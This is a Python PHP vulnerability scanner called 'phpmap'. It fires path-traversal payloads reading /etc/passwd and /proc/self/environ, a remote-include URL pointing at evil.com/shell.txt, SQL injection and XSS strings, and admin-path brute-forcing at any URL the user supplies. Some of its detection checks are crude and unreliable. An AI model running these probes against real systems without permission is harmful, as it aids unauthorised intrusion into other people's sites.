#!/usr/bin/env python3

import argparse
import requests
import re
import sys
import threading

__version__ = "1.0.0"

BANNER = """
 ____  _   _ ____  __  __    _    ____  
|  _ \| | | |  _ \|  \/  |  / \  |  _ \ 
| |_) | | | | |_) | |\/| | / _ \ | |_) |
|  __/| |_| |  __/| |  | |/ ___ \|  __/ 
|_|    \___/|_|   |_|  |_/_/   \_\_|    
                                        
PHPMap v1.0.0 - PHP Vulnerability Scanner
"""

parser = argparse.ArgumentParser(description="phpmap - PHP vulnerability scanner and exploitation framework")
parser.add_argument("-u", "--url", help="Target URL")
parser.add_argument("--lfi", help="Run Local File Inclusion scanner", action="store_true")
parser.add_argument("--rfi", help="Run Remote File Inclusion scanner", action="store_true")
parser.add_argument("--upload-bypass", help="Run Upload Bypass Scanner (coming soon)", action="store_true")
parser.add_argument("--deserialization", help="Run PHP Deserialization scanner (coming soon)", action="store_true")
parser.add_argument("--sql-injection", help="Run SQL Injection scanner", action="store_true")
parser.add_argument("--xss", help="Run Cross-Site Scripting (XSS) scanner", action="store_true")
parser.add_argument("--dir-listing", help="Check for open directory listings", action="store_true")
parser.add_argument("--backup-files", help="Scan for backup/config files", action="store_true")
parser.add_argument("--admin-finder", help="Bruteforce common admin paths", action="store_true")
parser.add_argument("--phpinfo", help="Check for public phpinfo page", action="store_true")
parser.add_argument("--version", action="version", version=f"phpmap {__version__}")

example = '''
Example usage:
  python3 phpmap.py -u http://target.com/index.php --lfi
  python3 phpmap.py -u http://target.com/index.php --rfi
  python3 phpmap.py -u http://target.com/index.php --sql-injection
  python3 phpmap.py -u http://target.com/index.php --admin-finder
'''
parser.epilog = example

args = parser.parse_args()

if not args.url:
    parser.print_help()
    sys.exit(1)

url = args.url


def lfi_scanner(target_url):
    lfi_payloads = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../proc/self/environ",
        "../../../../../../../../boot.ini",
        "../../../../../../../../windows/win.ini"
    ]
    for payload in lfi_payloads:
        test_url = f"{target_url}{payload}"
        try:
            r = requests.get(test_url)
            if "root:x:" in r.text or "[boot loader]" in r.text:
                print(f"[+] LFI detected: {test_url}")
        except:
            continue


def rfi_scanner(target_url):
    payload = "http://evil.com/shell.txt"
    test_url = f"{target_url}{payload}"
    try:
        r = requests.get(test_url)
        if "shell" in r.text.lower():
            print(f"[+] RFI detected: {test_url}")
    except:
        pass


def sql_injection_scanner(target_url):
    payloads = ["'", "' or '1'='1", '" or "1"="1']
    for payload in payloads:
        test_url = f"{target_url}{payload}"
        try:
            r = requests.get(test_url)
            if "sql" in r.text.lower() or "syntax" in r.text.lower():
                print(f"[+] Possible SQL Injection: {test_url}")
        except:
            continue


def xss_scanner(target_url):
    payload = "<script>alert('xss')</script>"
    test_url = f"{target_url}{payload}"
    try:
        r = requests.get(test_url)
        if payload in r.text:
            print(f"[+] XSS detected: {test_url}")
    except:
        pass


def directory_listing_check(target_url):
    try:
        r = requests.get(target_url)
        if "Index of /" in r.text:
            print(f"[+] Directory listing enabled: {target_url}")
    except:
        pass


def backup_file_check(target_url):
    files = ["config.php.bak", "index.php~", "wp-config.php.swp"]
    for f in files:
        try:
            r = requests.get(f"{target_url}/{f}")
            if r.status_code == 200:
                print(f"[+] Possible backup file found: {f}")
        except:
            continue


def admin_finder(target_url):
    paths = ["/admin", "/admin/login.php", "/cpanel", "/dashboard"]
    for path in paths:
        try:
            r = requests.get(f"{target_url.rstrip('/')}{path}")
            if r.status_code == 200:
                print(f"[+] Admin panel found: {path}")
        except:
            continue


def phpinfo_check(target_url):
    try:
        r = requests.get(f"{target_url}/phpinfo.php")
        if "phpinfo()" in r.text:
            print(f"[+] Public phpinfo() page detected: {target_url}/phpinfo.php")
    except:
        pass

print(BANNER)

if args.lfi:
    lfi_scanner(url)
if args.rfi:
    rfi_scanner(url)
if args.sql_injection:
    sql_injection_scanner(url)
if args.xss:
    xss_scanner(url)
if args.dir_listing:
    directory_listing_check(url)
if args.backup_files:
    backup_file_check(url)
if args.admin_finder:
    admin_finder(url)
if args.phpinfo:
    phpinfo_check(url)
